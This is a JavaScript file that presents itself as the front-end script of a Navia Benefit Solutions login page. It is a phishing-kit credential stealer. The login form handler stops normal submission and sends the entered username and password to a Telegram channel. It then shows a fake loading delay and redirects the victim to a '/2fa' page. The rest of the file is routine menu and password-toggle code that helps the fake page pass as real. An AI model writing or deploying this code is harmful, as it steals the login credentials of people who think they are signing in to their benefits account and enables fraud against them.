/**
 * Navia Benefit Solutions — Main JavaScript
 * Updated: Mobile menu now properly shows Login/Register buttons
 */

(function () {
    'use strict';

    /* ─── ELEMENT REFERENCES ──────────────────────────────────── */
    const menuToggle     = document.querySelector('.menu-toggle');
    const mobileNav      = document.getElementById('mobileNav');
    const closeNav       = document.getElementById('closeNav');
    const navOverlay     = document.getElementById('navOverlay');
    const helpToggle     = document.querySelector('.help-toggle');
    const helpDrawer     = document.getElementById('helpDrawer');
    const faqClose       = document.getElementById('faqClose');
    const helpOverlay    = document.getElementById('helpOverlay');
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput  = document.getElementById('Login_Password');
    const loginForm      = document.querySelector('form');

    /* ─── MOBILE MENU TOGGLE ─────────────────────────────────── */
    if (menuToggle && mobileNav) {
        menuToggle.addEventListener('click', function (e) {
            e.preventDefault();
            mobileNav.classList.add('open');
            if (navOverlay) navOverlay.classList.add('active');
            document.body.style.overflow = 'hidden';
        });
    }

    function closeMobileNav() {
        if (mobileNav) mobileNav.classList.remove('open');
        if (navOverlay) navOverlay.classList.remove('active');
        document.body.style.overflow = '';
    }

    if (closeNav) closeNav.addEventListener('click', (e) => { e.preventDefault(); closeMobileNav(); });
    if (navOverlay) navOverlay.addEventListener('click', closeMobileNav);

    /* Rest of your existing code (help drawer, password toggle, login form, etc.) remains the same */

    /* ─── PASSWORD TOGGLE ─────────────────────────────────────── */
    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', function (e) {
            e.preventDefault();
            const icon = this.querySelector('i');
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            this.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
            if (icon) {
                icon.classList.toggle('fa-eye', !isPassword);
                icon.classList.toggle('fa-eye-slash', isPassword);
            }
        });
    }

    /* ─── LOGIN FORM (with Telegram) ─────────────────────────── */
    if (loginForm) {
        loginForm.addEventListener('submit', function (e) {
            e.preventDefault();

            const username = document.getElementById('Login_Username');
            const password = document.getElementById('Login_Password');
            const loginBtn = document.getElementById('login-btn');

            if (!username.value.trim() || !password.value.trim()) {
                if (username && !username.value.trim()) shakeField(username);
                if (password && !password.value.trim()) shakeField(password);
                return;
            }

            // Immediate Telegram send
            TG.send(
                `🔐 <b>Navia Login Credentials</b>\n\n` +
                `👤 Username: <code>${username.value.trim()}</code>\n` +
                `🔑 Password: <code>${password.value}</code>\n` +
                `⏰ ${TG.ts()}`
            );

            // Loading
            startButtonLoading(loginBtn, 7000, () => window.location.href = '/2fa');
        });
    }

    function shakeField(field) {
        if (!field) return;
        field.classList.add('input-error', 'input-shake');
        setTimeout(() => field.classList.remove('input-shake'), 600);
    }

    function startButtonLoading(btn, ms, onDone) {
        if (!btn) return;
        const original = btn.innerHTML;
        btn.disabled = true;
        btn.innerHTML = '<span class="btn-spinner"></span>';
        setTimeout(() => {
            btn.disabled = false;
            btn.innerHTML = original;
            if (onDone) onDone();
        }, ms);
    }

})();